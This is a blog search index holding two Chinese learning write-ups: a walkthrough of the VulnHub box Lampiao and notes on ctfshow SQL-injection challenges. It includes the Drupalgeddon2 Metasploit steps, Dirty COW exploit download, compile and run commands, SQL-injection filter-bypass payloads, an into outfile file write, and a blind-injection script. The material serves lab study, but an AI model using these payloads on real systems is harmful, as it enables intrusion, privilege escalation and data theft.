<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Lampiao</title>
    <url>/2021/05/24/Lampiao/</url>
    <content><![CDATA[<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><p><img src="/2021/05/24/Lampiao/image-20210519163046106.png" alt="image-20210519163046106"></p>
<p>前提信息：</p>
<p>kali <code>192.168.229.129</code></p>
<p>Lampiao未知</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.299.0&#x2F;24</span><br><span class="line">&#x2F;&#x2F; 扫描192.168.229网段下的所有主机</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210519164912383.png" alt="image-20210519164912383"></p>
<p>起始ip为192.168.229.1，结束ip为192.168.229.254，而kali ip为192.168.229.129，所以靶机ip就是192.168.229.135</p>
<blockquote>
<p>192.168.229.1为虚拟网卡地址</p>
<p>192.168.229.2是虚拟网卡网关地址</p>
</blockquote>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.229.135 -p 1-65535</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210519170419899.png" alt="image-20210519170419899"></p>
<p>扫描出了22、80、1898端口</p>
<p>22端口进行ssh弱口令爆破</p>
<blockquote>
<p>具体操作可以使用<code>msf</code>或是<code>hydra</code>进行爆破</p>
</blockquote>
<p>80端口<code>It&#39;s easy Fidumaegud!</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210519170704797.png" alt="image-20210519170704797"></p>
<p>1898端口是一个博客的登录界面</p>
<p><img src="/2021/05/24/Lampiao/image-20210519171331868.png" alt="image-20210519171331868"></p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>使用工具<code>nikto</code>或是<code>dirb</code></p>
<blockquote>
<p>nikto是一款web漏洞扫描工具</p>
<p>dirb是web目录扫描工具</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;192.168.229.135:1898</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210522115857417.png" alt="image-20210522115857417"></p>
<p><img src="/2021/05/24/Lampiao/image-20210522115927983.png" alt="image-20210522115927983"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.229.135:1898</span><br></pre></td></tr></table></figure>


<p><img src="/2021/05/24/Lampiao/image-20210522115825431.png" alt="image-20210522115825431"></p>
<p><img src="/2021/05/24/Lampiao/image-20210522120000875.png" alt="image-20210522120000875"></p>
<h3 id="存在敏感信息泄露"><a href="#存在敏感信息泄露" class="headerlink" title="存在敏感信息泄露"></a>存在<strong>敏感信息泄露</strong></h3><p>访问<code>includes</code>目录</p>
<p><img src="/2021/05/24/Lampiao/image-20210522203456574.png" alt="image-20210522203456574"></p>
<p>发现存在<code>robots.txt</code>文件</p>
<p>访问<code>robots.txt</code>目录</p>
<p><img src="/2021/05/24/Lampiao/image-20210522234134580.png" alt="image-20210522234134580"></p>
<p>在<code>profiles/README.txt</code>文件中会发现cms是<code>drupal</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210522212104924.png" alt="image-20210522212104924"></p>
<p>在<code>CHANGELOG.txt</code>文件中发现<code>drupal</code>版本为7.54，更新时间为<code>2017-02-01</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523103734866.png" alt="image-20210523103734866"></p>
<p>百度查找<code>drupal</code>漏洞</p>
<p><img src="/2021/05/24/Lampiao/image-20210523103946363.png" alt="image-20210523103946363"></p>
<p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">漏洞分析</a></p>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><h4 id="search-drupal"><a href="#search-drupal" class="headerlink" title="search drupal"></a><code>search drupal</code></h4><p>搜索相应漏洞</p>
<p><img src="/2021/05/24/Lampiao/image-20210523104844441.png" alt="image-20210523104844441"></p>
<p>在<code>2018-03-28</code>drupal爆出一个RCE，CVE编号为CVE-2018-7600</p>
<h4 id="show-options"><a href="#show-options" class="headerlink" title="show options"></a><code>show options</code></h4><p><img src="/2021/05/24/Lampiao/image-20210523110539063.png" alt="image-20210523110539063"></p>
<h4 id="use-exploit-unix-webapp-drupal-drupalgeddon2"><a href="#use-exploit-unix-webapp-drupal-drupalgeddon2" class="headerlink" title="use exploit/unix/webapp/drupal_drupalgeddon2"></a>use exploit/unix/webapp/drupal_drupalgeddon2</h4><h4 id="set-rhosts-192-168-229-135"><a href="#set-rhosts-192-168-229-135" class="headerlink" title="set rhosts 192.168.229.135"></a>set rhosts 192.168.229.135</h4><h4 id="set-rport-1898"><a href="#set-rport-1898" class="headerlink" title="set rport 1898"></a>set rport 1898</h4><h4 id="show-targets"><a href="#show-targets" class="headerlink" title="show targets"></a>show targets</h4><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p><img src="/2021/05/24/Lampiao/image-20210523110617795.png" alt="image-20210523110617795"></p>
<h4 id="获取到会话"><a href="#获取到会话" class="headerlink" title="获取到会话"></a>获取到会话</h4><p><img src="/2021/05/24/Lampiao/image-20210523112127404.png" alt="image-20210523112127404"></p>
<h4 id="交互式命令"><a href="#交互式命令" class="headerlink" title="交互式命令"></a>交互式命令</h4><blockquote>
<p>执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，</p>
<p>命令如下：<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>//切换到/bin/bash</p>
</blockquote>
<h3 id="查看文件及其权限"><a href="#查看文件及其权限" class="headerlink" title="查看文件及其权限"></a>查看文件及其权限</h3><p><code>ls -li</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523162343113.png" alt="image-20210523162343113"></p>
<p>发现两个音频文件，两张图片</p>
<p>下载<code>audio.m4a</code>会朗读:<code>user t-i-a-g-o</code>有一说一没有听出来emmmm</p>
<blockquote>
<p>用户名可能是<code>tiago</code></p>
</blockquote>
<p>而图片<code>qrc.png</code>是一个二维码，内容是：<code>Try harder!muahuahua</code></p>
<p>另外的图片和音频并没有发现有用信息</p>
<blockquote>
<p>还是对站点的信息收集不够全面，其实在1898端口那个界面就能发现一些猫腻</p>
<p>两个文章的url分别是：<code>http://192.168.229.135:1898/?q=node/1</code>和<code>http://192.168.229.135:1898/?q=node/3</code>唯独没有<code>/?q=node/2</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523165940420.png" alt="image-20210523165940420"></p>
<p>访问会发现两个重要的信息<code>audio.m4a</code>和<code>qrc.png</code></p>
</blockquote>
<h3 id="查看账号信息"><a href="#查看账号信息" class="headerlink" title="查看账号信息"></a>查看账号信息</h3><p><code>cat /etc/passwd</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523160700792.png" alt="image-20210523160700792"></p>
<h3 id="查看操作系统和内核版本"><a href="#查看操作系统和内核版本" class="headerlink" title="查看操作系统和内核版本"></a>查看操作系统和内核版本</h3><p><code>uname -a</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210523160928039.png" alt="image-20210523160928039"></p>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>权限是低权限www-data用户，需要提权</p>
<h3 id="脏牛（Dirty-COW）"><a href="#脏牛（Dirty-COW）" class="headerlink" title="脏牛（Dirty COW）"></a>脏牛（Dirty COW）</h3><p><img src="/2021/05/24/Lampiao/t017c4bda502a18a05c.png" alt="t017c4bda502a18a05c"></p>
<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Linux内核&gt;=2.6.22</strong> （2007年发行）开始就受影响了，直到2016年10月18日才修复</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p>
<h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><blockquote>
<p>get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的</p>
</blockquote>
<h3 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h3><p><code>Lampiao</code>内核版本为<code>4.4.0</code></p>
<p>可以去网上搜索exp或是直接使用kali中自带的<code>searchsploit</code></p>
<h4 id="searchsploit-dirty"><a href="#searchsploit-dirty" class="headerlink" title="searchsploit dirty"></a><code>searchsploit dirty</code></h4><p><img src="/2021/05/24/Lampiao/image-20210524091130922.png" alt="image-20210524091130922"></p>
<h4 id="cp复制到本地"><a href="#cp复制到本地" class="headerlink" title="cp复制到本地"></a>cp复制到本地</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/40847.cpp ~</span><br><span class="line">python -m SimpleHTTPServer 5555</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里一开始是在root权限下，复制的文件也在/root目录下，以至于在使用python开启5555端口的服务时靶机并不能下载该文件</p>
<p>解决：切换到<code>user</code>用户下重新下载即可</p>
</blockquote>
<p><img src="/2021/05/24/Lampiao/image-20210524094133696.png" alt="image-20210524094133696"></p>
<p><img src="/2021/05/24/Lampiao/image-20210524093919689.png" alt="image-20210524093919689"></p>
<h4 id="下载kali的40847-cpp"><a href="#下载kali的40847-cpp" class="headerlink" title="下载kali的40847.cpp"></a>下载kali的<code>40847.cpp</code></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.229.129:5555/40847.cpp</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/24/Lampiao/image-20210524094802217.png" alt="下载失败"></p>
<p><img src="/2021/05/24/Lampiao/image-20210524095054903.png" alt="image-20210524095054903"></p>
<h4 id="执行gcc编译可执行文件，可直接提权"><a href="#执行gcc编译可执行文件，可直接提权" class="headerlink" title="执行gcc编译可执行文件，可直接提权"></a>执行gcc编译可执行文件，可直接提权</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数分析：</p>
<p>参数分析</p>
<p>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告<br>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告<br>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高<br>-std=c++11就是用按C++2011标准来编译的<br>-pthread 在Linux中要用到多线程时，需要链接pthread库<br>-o dcow gcc生成的目标文件,名字为dcow</p>
</blockquote>
<p><img src="/2021/05/24/Lampiao/image-20210524095337436.png" alt="image-20210524095337436"></p>
<h4 id="查看-40847"><a href="#查看-40847" class="headerlink" title="查看./40847"></a>查看<code>./40847</code></h4><p><img src="/2021/05/24/Lampiao/image-20210524095406136.png" alt="image-20210524095406136"></p>
<h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p><img src="/2021/05/24/Lampiao/image-20210524213622884.png" alt="image-20210524213622884"></p>
<h4 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到<code>flag</code></h4><blockquote>
<p>第一次刷vulnhub靶机，可以说是完完全全参考大佬们的博客进行的，真的很水，不过也学到了许多干货，争取下个靶机可以先自己来刷</p>
<p>wuwuwu我是fw</p>
</blockquote>
<h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><p>在<code>/var/www/html/sites/default/settings.php</code>存在敏感信息</p>
<p><img src="/2021/05/24/Lampiao/image-20210524221756239.png" alt="image-20210524221756239"></p>
<p>结合用户名<code>tiago</code>，当使用密码为<code>Virgulino</code>可以成功提权为<code>tiago</code></p>
<p><img src="/2021/05/24/Lampiao/image-20210524222146058.png" alt="image-20210524222146058"></p>
<p>在获取到开发22端口的信息后，可以使用工具进行弱口令爆破emmmm不过暂时还没有总结，附上大佬们的一些工具和流程</p>
<blockquote>
<p>cewl：通过爬行网站获取关键信息创建一个密码字典<br>hydra：神器九头蛇，网上有太多资料</p>
<p>先利用cewl来生成一份结合网站目标的社工性质的密码字典、不理解的可以搜索网上搜索cewl学习，然后九头蛇暴力破解得到用户密码</p>
</blockquote>
<h2 id="知识点总结："><a href="#知识点总结：" class="headerlink" title="知识点总结："></a>知识点总结：</h2><ul>
<li>信息收集</li>
</ul>
<blockquote>
<p>nmap -sP ip</p>
<p>nmap ip -p 1-63335</p>
<p>nikto -h <a href="http://ip/">http://ip</a></p>
<p>dirb <a href="http://ip/">http://ip</a></p>
</blockquote>
<ul>
<li>msf使用</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>脏牛提权</li>
</ul>
<blockquote>
<p>searchsploit dirty</p>
<p>cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~<br>python -m SimpleHTTPServer 5555</p>
<p>wget <a href="http://192.168.229.129:5555/40847.cpp">http://192.168.229.129:5555/40847.cpp</a></p>
<p>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</p>
<p>./40847</p>
</blockquote>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/2552">vulnhub|渗透测试lampiao</a></p>
<p><a href="https://blog.csdn.net/qq_34801745/article/details/103731088">VulnHub-Lampiao-Walkthrough渗透学习</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/89353276">Vulnhub之路Ⅰ——Lampiao</a></p>
<p><a href="http://blog.leanote.com/post/snowming/f9e7fcdb4afb">记一次 Drupal + 脏牛提权 Ubuntu </a></p>
<p><a href="https://www.jianshu.com/p/df72d1ee1e3e">脏牛Linux本地提权漏洞复现(CVE-2016-5195)</a></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>web入门sql注入</title>
    <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
<blockquote>
<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
</blockquote>
<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
<p>而且会进行正则匹配</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
<blockquote>
<p>后面又学到了使用<code>base64</code>进行绕过</p>
</blockquote>
<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>对flag和数字进行了过滤，注的时候没有回显</p>
<p>抓包找一下url</p>
<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
<p>师傅们直接上脚本tql</p>
<p>fw不会，也想不到wwww</p>
<p>假期一定学</p>
<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
</blockquote>
<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
<p>仿照web174构造</p>
<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
<blockquote>
<p>Apache默认根目录是:/var/www/html</p>
</blockquote>
<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
<blockquote>
<p>空格绕过的方式：</p>
<ol>
<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
<li>括号绕过，常用于时间盲注</li>
</ol>
</blockquote>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
<p>晴天师傅的通杀payload</p>
<p><code>?id=&#39;or(1)%23</code></p>
